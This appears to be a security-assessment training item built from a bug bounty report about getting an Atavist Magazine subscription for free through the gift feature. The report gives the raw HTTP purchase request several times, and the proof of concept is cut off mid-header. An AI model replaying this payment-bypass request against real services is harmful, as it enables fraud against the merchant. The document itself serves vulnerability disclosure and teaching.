# ACCESS_CONTROL — h1

- source: h1
- class: access_control
- cwe: CWE-284
- severity: high
- program: automattic
- quality_score: 11

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Can buy Atavist Magazine subscription for free

**Vulnerability Description:**
## Summary:
Hi team
If you go to https://magazine.atavist.com/ and scroll down. You will see membership price is $25, but I found a way to buy this subscription for free via Gift feature.
When you send gift request before adding any credit card to your account you will see this response :

{F936531}

However, if you check the gift recipient's email you will see the Gift email that contains the gift link.

{F936533}

## Steps To Reproduce:

  1. Just send this request (change `YOUR_EMAIL`, `YOUR_PASSWORD`, `RECIPIENT_EMAIL`, `gift_timestamp to current date, it was 2020-8-4 while reporting this`)  :

```http
POST /api/v2/store/purchase.php HTTP/1.1
Host: magazine.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 204
Origin: https://magazine.atavist.com
DNT: 1
Connection: close
Referer: https://magazine.atavist.com/

email=YOUR_EMAIL&password=[REDACTED_PASSWORD]
```

You will see `{"error":"invalid_request_error","error_description":"The customer must have an active payment source attached."}` in response but if you check the recipient's email, you will see the gift link.

## Impact

Able to buy magazine membership for free

Thanks,
Bugra

**Steps to Reproduce:**
1. Just send this request (change `YOUR_EMAIL`, `YOUR_PASSWORD`, `RECIPIENT_EMAIL`, `gift_timestamp to current date, it was 2020-8-4 while reporting this`)  :

```http
POST /api/v2/store/purchase.php HTTP/1.1
Host: magazine.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 204
Origin: https://magazine.atavist.com
DNT: 1
Connection: close
Referer: https://magazine.atavist.com/

email=YOUR_EMAIL&password=[REDACTED_PASSWORD]
```

You will see `{"error":"invalid_request_error","error_description":"The customer must have an active payment source attached."}` in response but if you check the recipient's email, you will see the gift link.

**Proof of Concept:**
```http
POST /api/v2/store/purchase.php HTTP/1.1
Host: magazine.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 204
Origin: https://magazine.atavist.com
DNT

## Analysis / Response

**Vulnerability Class:** access_control
**CWE:** CWE-284
**Weakness:** Improper Access Control - Generic
**Severity:** high
**Endpoint Pattern:** POST /api/v2/store/purchase.php

**Impact Assessment:**
Able to buy magazine membership for free

Thanks,
Bugra

**Remediation:**
Implement server-side authorization checks on every request. Use role-based access control. Deny by default. Never rely on client-side access control.
